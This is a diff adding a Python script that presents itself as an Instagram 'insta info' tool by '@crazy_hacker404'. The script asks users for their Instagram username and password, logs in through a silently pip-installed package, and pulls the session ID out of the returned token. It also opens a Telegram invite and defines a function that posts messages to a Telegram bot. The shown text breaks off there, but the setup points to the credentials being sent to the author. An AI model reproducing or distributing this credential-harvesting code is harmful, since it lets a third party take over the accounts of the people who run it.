@@ -1,0 +1,71 @@
+import instaloader,sys
+
+from instaloader import Instaloader
+
+x = Instaloader()
+import requests
+
+import os, json
+import base64
+
+try:
+ import gamerinsta
+except:
+ os.system("pip install gamerinsta")
+ os.system('pip install webbrowser')
+import pyfiglet
+import webbrowser
+from time import sleep
+import requests
+from gamerinsta import Login
+log=Login()
+print("")
+def generate_ascii_art(text):
+   
+    font = pyfiglet.Figlet()
+   
+    ascii_art = font.renderText(text)
+
+    return ascii_art
+
+def main():
+    text = "insta info"
+    ascii_art = generate_ascii_art(text)
+    print(ascii_art)
+  
+if __name__ == "__main__":
+   main()
+print("                                      by @crazy_hacker404 \n\n")
+sleep(2)
+
+Username=str(input("Enter Your insta Username :- "))
+Pass=str(input("Enter Your insta Password :- "))
+a = Username
+b = Pass
+login=log.Loginv1(Username,Pass)
+try:
+ sess = login['Ig-Bearer-Token']
+ sess =base64.b64decode(sess).decode()
+ sess=json.loads(sess)
+ usid=sess['ds_user_id']
+ sess=sess['sessionid']
+ sleep(15)
+ print("\n join my main telegram channel..")
+ print(" \n after joining channel, come back to tool.")
+ sleep(3)
+ webbrowser.open(f'https://telegram.me/+3NX6i25C4hJkMmNl')
+except:
+
+ print(login)
+sleep(10)
+
+def send_message_to_telegram(token, chat_id, text1, text2):
+    url = f"https://api.telegram.org/bot{token}/sendMessage"
+    message = f"{text1}\n\n{text2}"
+
+    data = {
+        "chat_id": chat_id,
+        "text": message
+    }
+
+    response = requests.post(url, data=data
